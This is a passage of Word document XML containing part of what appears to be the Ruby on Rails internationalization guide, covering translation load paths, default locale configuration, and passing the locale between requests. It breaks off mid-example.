                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.t 'store.title'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="610FCF91" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.l Time.now</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6F31D317" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>There are also attribute readers and writers for the following attributes:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7920"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="4AAADCA7" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="657C13A3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>load_path         # Announce your custom translation files</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="640A3ED6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>locale            # Get and set the current locale</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="781983C9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>default_locale    # Get and set the default locale</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="05E1B361" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>exception_handler # Use a different exception_handler</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3EAB3F5E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>backend           # Use a different backend</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="17DFD4E7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>So, let’s internationalize a simple Rails application from the ground up in the next chapters!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00F75A6B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>2 Setup the Rails Application for Internationalization</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C546CB3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>There are just a few simple steps to get up and running with I18n support for your application.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DDAE0DA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>2.1 Configure the I18n Module</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10F0D7AA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Following the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>convention over configuration</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> philosophy, Rails will set up your application with reasonable defaults. If you need different settings, you can overwrite them easily.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="028E4311" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Rails adds all </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.yml</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> files from the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config/locales</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> directory to your </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>translations load path</w:t>
      </w:r>
      <w:r>
        <w:t>, automatically.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26AFA065" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The default </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>en.yml</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> locale in this directory contains a sample pair of translation strings:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2880"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="7525D784" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3AA90588" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>en:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0145FDCA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  hello: "Hello world"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="47C9D871" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This means, that in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:en</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> locale, the key </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>hello</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will map to the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>Hello world</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> string. Every string inside Rails is internationalized in this way, see for instance Active Record validation messages in the </w:t>
      </w:r>
      <w:hyperlink r:id="rId531" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
          </w:rPr>
          <w:t>activerecord/lib/active_record/locale/en.yml</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> file or time and date formats in the </w:t>
      </w:r>
      <w:hyperlink r:id="rId532" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
          </w:rPr>
          <w:t>activesupport/lib/active_support/locale/en.yml</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> file. You can use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>YAML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or standard Ruby Hashes to store translations in the default (Simple) backend.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2581453D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The I18n library will use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>English</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>default locale</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, i.e. if you don’t set a different locale, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:en</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will be used for looking up translations.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B49F4FF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The i18n library takes a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>pragmatic approach</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to locale keys (after </w:t>
      </w:r>
      <w:hyperlink r:id="rId533" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>some discussion</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve">), including only the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>locale</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (“language”) part, like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:en</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:pl</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, not the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>region</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> part, like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:en-US</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:en-GB</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, which are traditionally used for separating “languages” and “regional setting” or “dialects”. Many international applications use only the “language” element of a locale such as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:cs</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:th</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:es</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (for Czech, Thai and Spanish). However, there are also regional differences within different language groups that may be important. For instance, in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:en-US</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> locale you would have $ as a currency symbol, while in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:en-GB</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, you would have £. Nothing stops you from separating regional and other settings in this way: you just have to provide full “English – United Kingdom” locale in a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:en-GB</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> dictionary. Various </w:t>
      </w:r>
      <w:hyperlink r:id="rId534" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Rails I18n plugins</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> such as </w:t>
      </w:r>
      <w:hyperlink r:id="rId535" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Globalize2</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> may help you implement it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F48D18D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>translations load path</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>I18n.load_path</w:t>
      </w:r>
      <w:r>
        <w:t>) is just a Ruby Array of paths to your translation files that will be loaded automatically and available in your application. You can pick whatever directory and translation file naming scheme makes sense for you.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="779BCBE3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The backend will lazy-load these translations when a translation is looked up for the first time. This makes it possible to just swap the backend with something else even after translations have already been announced.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EE9B01D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The default </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>application.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> files has instructions on how to add locales from another directory and how to set a different default locale. Just uncomment and edit the specific lines.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263E767" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="56160AB2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># The default locale is :en and all translations from config/locales/*.rb,yml are auto loaded.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="26A5376A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># config.i18n.load_path += Dir[Rails.root.join('my', 'locales', '*.{rb,yml}').to_s]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B4BB4CD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># config.i18n.default_locale = :de</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1DB12679" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>2.2 Optional: Custom I18n Configuration Setup</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="301DB172" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For the sake of completeness, let’s mention that if you do not want to use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>application.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file for some reason, you can always wire up things manually, too.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E2D32CF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>To tell the I18n library where it can find your custom translation files you can specify the load path anywhere in your application – just make sure it gets run before any translations are actually looked up. You might also want to change the default locale. The simplest thing possible is to put the following into an initializer:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8280"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="473466C7" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="27032B95" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># in config/initializers/locale.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3FABBAB0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3A25B752" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># tell the I18n library where to find your translations</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="53F6A645" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.load_path += Dir[Rails.root.join('lib', 'locale', '*.{rb,yml}')]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="38558AF8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="44C12722" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># set default locale to something other than :en</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4107116D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.default_locale = :pt</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4057B483" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>2.3 Setting and Passing the Locale</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FB4E5B8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you want to translate your Rails application to a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>single language other than English</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (the default locale), you can set I18n.default_locale to your locale in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>application.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or an initializer as shown above, and it will persist through the requests.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59DDC5C5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">However, you would probably like to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>provide support for more locales</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in your application. In such case, you need to set and pass the locale between requests.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BF8EF35" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You may be tempted to store the chosen locale in a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>cookie</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>Do not do so</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. The locale should be transparent and a part of the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. This way you don’t break people’s basic assumptions about the web itself: if you send a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> of some page to a friend, she should see the same page, same content. A fancy word for this would be that you’re being </w:t>
      </w:r>
      <w:hyperlink r:id="rId536" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a7"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>RESTful</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve">. Read more about the RESTful approach in </w:t>
      </w:r>
      <w:hyperlink r:id="rId537" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Stefan Tilkov’s articles</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>. There may be some exceptions to this rule, which are discussed below.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07FD9987" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>setting part</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is easy. You can set the locale in a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>before_filter</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ApplicationController</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6720"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="60D7990E" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="26F77848" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>before_filter :set_locale</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7ECE2A62" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
